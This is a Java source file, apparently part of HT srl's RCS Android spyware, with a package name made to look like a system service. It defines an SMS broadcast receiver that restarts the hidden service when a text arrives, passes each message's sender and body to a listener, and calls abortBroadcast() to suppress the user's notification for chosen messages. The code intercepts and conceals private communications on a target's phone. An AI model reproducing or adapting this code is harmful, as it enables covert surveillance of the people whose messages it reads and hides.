/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : BroadcastMonitorSms.java
 * Created      : 6-mag-2011
 * Author		: zeno <- menzogne!
 * *******************************************/

package com.android.service.listener;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

import com.android.service.Core;
import com.android.service.Messages;
import com.android.service.ServiceCore;
import com.android.service.Sms;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;

public class BroadcastMonitorSms extends BroadcastReceiver {
	private static final String TAG = "BroadcastMonitorSms"; //$NON-NLS-1$

	// Apparentemente la notifica di SMS inviato non viene inviata di proposito
	@Override
	public void onReceive(Context context, Intent intent) {
		if (Core.isServiceRunning() == false) {
			Intent serviceIntent = new Intent(context, ServiceCore.class);
			
		    //serviceIntent.setAction(Messages.getString("com.android.service.ServiceCore"));
		    context.startService(serviceIntent);
			
		    if (Cfg.DEBUG) {
				Check.log(TAG + " (onReceive): Started from SMS"); //$NON-NLS-1$
			}
		    
			return;
		}
		
		if (intent == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onReceive): Intent null"); //$NON-NLS-1$
			}

			return;
		}

		final Bundle bundle = intent.getExtras();

		if (bundle == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onReceive): Bundle null"); //$NON-NLS-1$
			}

			return;
		}

		SmsMessage[] msgs = null;

		// Prendiamo l'sms
		final Object[] pdus = (Object[]) bundle.get(Messages.getString("26.0")); //$NON-NLS-1$
		msgs = new SmsMessage[pdus.length];

		for (int i = 0; i < msgs.length; i++) {
			msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);

			final int result = ListenerSms.self().dispatch(
					new Sms(msgs[i].getOriginatingAddress(), msgs[i].getMessageBody().toString(), System
							.currentTimeMillis(), false));

			// 1 means "remove notification for this sms"
			if ((result & 1) == 1) {
				abortBroadcast();
			}
		}
	}
}
